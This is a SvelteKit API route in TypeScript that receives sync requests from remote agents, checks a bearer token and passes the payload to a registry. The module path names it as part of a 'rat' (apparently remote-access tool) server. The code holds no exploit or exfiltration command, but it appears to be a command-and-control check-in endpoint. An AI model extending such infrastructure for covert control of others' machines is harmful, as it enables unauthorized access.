import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store';
import type { AgentSyncRequest } from '../../../../../../../shared/types/messages';
import { decode, encode } from '@msgpack/msgpack';

function getBearerToken(header: string | null): string | undefined {
	if (!header) {
		return undefined;
	}
	const match = header.match(/^Bearer\s+(.+)$/i);
	return match?.[1]?.trim();
}

export const POST: RequestHandler = async ({ params, request, getClientAddress }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let payload: AgentSyncRequest;
	try {
		const contentType = request.headers.get('content-type') || '';
		if (contentType.includes('application/msgpack')) {
			const buffer = await request.arrayBuffer();
			payload = decode(buffer) as AgentSyncRequest;
		} else {
			payload = (await request.json()) as AgentSyncRequest;
		}
	} catch {
		throw error(400, 'Invalid sync payload');
	}

	const token = getBearerToken(request.headers.get('authorization'));
	if (!token) {
		throw error(401, 'Missing agent key');
	}

	try {
		const response = await registry.syncAgent(id, token, payload, {
			remoteAddress: getClientAddress()
		});

		const accept = request.headers.get('accept') || '';
		if (accept.includes('application/msgpack')) {
			return new Response(encode(response) as BodyInit, {
				headers: { 'Content-Type': 'application/msgpack' }
			});
		}

		return json(response);
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to sync agent');
	}
};
